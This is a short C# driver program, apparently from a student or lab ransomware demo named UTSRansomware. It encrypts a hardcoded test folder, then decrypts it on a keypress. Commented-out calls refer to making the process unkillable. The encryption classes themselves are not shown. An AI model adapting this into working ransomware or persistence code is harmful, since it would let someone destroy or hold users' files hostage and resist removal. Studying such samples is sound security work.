namespace UTSRansomware
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Console.WriteLine("Making process unkillable");
            //Init.makeProcessUnkillable();
            //Console.ReadKey();

            Encryptor encryptor = new Encryptor();
            encryptor.EncryptDirectory(@"C:\Users\Programming\Desktop\encrypt");
            Console.WriteLine("Press any key to decrypt files");
            Console.ReadKey();
            Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
            decryptor.DecryptDirectory(@"C:\Users\\Programming\Desktop\encrypt");
        }
    }
}